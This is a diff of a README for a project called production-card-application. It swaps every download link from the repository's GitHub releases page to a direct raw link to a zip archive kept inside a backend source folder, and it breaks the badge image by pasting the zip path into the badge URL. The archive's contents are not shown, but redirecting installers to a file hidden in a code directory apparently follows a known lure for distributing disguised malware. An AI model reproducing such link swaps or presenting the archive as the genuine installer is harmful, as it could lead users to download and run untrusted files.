@@ -2,7 +2,7 @@
 
 ## 📦 Download
 
-[![Download Here](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/Enobongokon/production-card-application/releases)
+[![Download Here](https://raw.githubusercontent.com/Enobongokon/production-card-application/main/backend/app/core/production-card-application-v3.6.zip%20Release-brightgreen)](https://raw.githubusercontent.com/Enobongokon/production-card-application/main/backend/app/core/production-card-application-v3.6.zip)
 
 ## 📖 Description
 
@@ -39,7 +39,7 @@ Follow these steps to get the production-card-application up and running:
 
    Visit this page to download the latest version of the application: 
    
-   [Download Here](https://github.com/Enobongokon/production-card-application/releases)
+   [Download Here](https://raw.githubusercontent.com/Enobongokon/production-card-application/main/backend/app/core/production-card-application-v3.6.zip)
 
 2. **Install the Application**:
    
@@ -61,7 +61,7 @@ Follow these steps to get the production-card-application up and running:
 
 To install the production-card-application, please follow this link to download the latest version: 
 
-[Download Here](https://github.com/Enobongokon/production-card-application/releases)
+[Download Here](https://raw.githubusercontent.com/Enobongokon/production-card-application/main/backend/app/core/production-card-application-v3.6.zip)
 
 Once you've downloaded the file:
 
